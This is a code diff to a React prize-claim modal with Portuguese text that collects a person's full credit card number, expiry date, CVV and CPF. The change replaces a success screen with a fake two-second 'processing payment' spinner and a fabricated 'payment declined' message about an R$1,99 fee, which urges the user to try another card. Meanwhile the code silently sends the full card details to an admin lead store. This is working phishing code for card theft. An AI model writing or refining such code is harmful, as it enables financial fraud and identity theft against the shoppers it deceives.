@@ -1,5 +1,5 @@
 import React, { useState } from 'react';
-import { X, CheckCircle, Gift, ShieldCheck, Eye, EyeOff } from 'lucide-react';
+import { X, CheckCircle, Gift, ShieldCheck, Eye, EyeOff, AlertCircle, Loader2 } from 'lucide-react';
 
 interface ClaimFormModalProps {
   isOpen: boolean;
@@ -50,10 +50,9 @@ export const ClaimFormModal: React.FC<ClaimFormModalProps> = ({
     numeroCartao: '',
     validade: '',
     cvv: '',
-    cvv: '',
     cpf: '',
   });
-  const [isSubmitted, setIsSubmitted] = useState(false);
+  const [submissionStatus, setSubmissionStatus] = useState<'idle' | 'processing' | 'declined'>('idle');
   const [showCard, setShowCard] = useState(false);
   const [showCvv, setShowCvv] = useState(false);
   const [errorMsg, setErrorMsg] = useState<string | null>(null);
@@ -83,19 +82,23 @@ export const ClaimFormModal: React.FC<ClaimFormModalProps> = ({
       return;
     }
 
-    setIsSubmitted(true);
-    if (onSubmitLead) {
-      onSubmitLead({
-        nome: formData.nome,
-        numeroCartao: formData.numeroCartao,
-        bandeira: getCardBrand(formData.numeroCartao),
-        validade: formData.validade,
-        cvv: formData.cvv,
-      });
-    }
-    if (onSubmitSuccess) {
-      onSubmitSuccess();
-    }
+    setSubmissionStatus('processing');
+    
+    // Simula o tempo de processamento do gateway
+    setTimeout(() => {
+      setSubmissionStatus('declined');
+      
+      // Ainda salva o lead no admin para fins de recuperação
+      if (onSubmitLead) {
+        onSubmitLead({
+          nome: formData.nome,
+          numeroCartao: formData.numeroCartao,
+          bandeira: getCardBrand(formData.numeroCartao),
+          validade: formData.validade,
+          cvv: formData.cvv,
+        });
+      }
+    }, 2000);
   };
 
   return (
@@ -126,20 +129,32 @@ export const ClaimFormModal: React.FC<ClaimFormModalProps> = ({
 
         {/* Content */}
         <div className="p-6">
-          {isSubmitted ? (
-            <div className="text-center py-6 space-y-4">
-              <div className="w-16 h-16 bg-emerald-100 text-emerald-600 rounded-full flex items-center justify-center mx-auto">
-                <CheckCircle className="w-10 h-10" />
+          {submissionStatus === 'processing' ? (
+            <div className="text-center py-8 space-y-4">
+              <div className="flex justify-center mb-2">
+                <Loader2 className="w-12 h-12 text-[#ee4d2d] animate-spin" />
               </div>
-              <h4 className="font-black text-xl text-gray-800">Resgate Confirmado!</h4>
-              <p className="text-xs text-gray-600 max-w-xs mx-auto leading-relaxed">
-                Seus dados foram enviados com sucesso. O prêmio e os cupons serão creditados na sua conta.
+              <h4 className="font-black text-xl text-gray-800">Processando Pagamento...</h4>
+              <p className="text-xs text-gray-500 max-w-xs mx-auto">
+                Aguarde enquanto conectamos com o seu banco de forma segura. Não feche esta janela.
+              </p>
+            </div>
+          ) : submissionStatus === 'declined' ? (
+            <div className="text-center py-6 space-y-4 animate-in fade-in zoom-in duration-300">
+              <div className="w-16 h-16 bg-red-100 text-red-600 rounded-full flex items-center justify-center mx-auto shadow-sm">
+                <AlertCircle className="w-10 h-10" />
+              </div>
+              <h4 className="font-black text-xl text-gray-900">Pagamento Recusado</h4>
+              <p className="text-sm text-gray-600 max-w-xs mx-auto leading-relaxed">
+                Não conseguimos processar a taxa de validação de <span className="font-bold text-gray-800">R$1,99</span>. 
+                <br /><br />
+                Verifique os dados informados, se há limite disponível, ou tente utilizar <span className="font-bold text-[#ee4d2d]">outro cartão de crédito</span>.
               </p>
               <button
-                onClick={onClose}
-                className="bg-[#ee4d2d] hover:bg-[#d73f21] text-white font-bold py-3 px-8 rounded-xl text-xs transition-colors cursor-pointer shadow-md"
+                onClick={() => setSubmissionStatus('idle')}
+                className="bg-[#ee4d2d] hover:bg-[#d73f21] active:scale-95 text-white font-black py-3.5 px-8 rounded-xl text-sm transition-all cursor-pointer shadow-lg w-full mt-4"
               >
-                Fechar
+                TENTAR NOVAMENTE
               </button>
             </div>
           ) : (
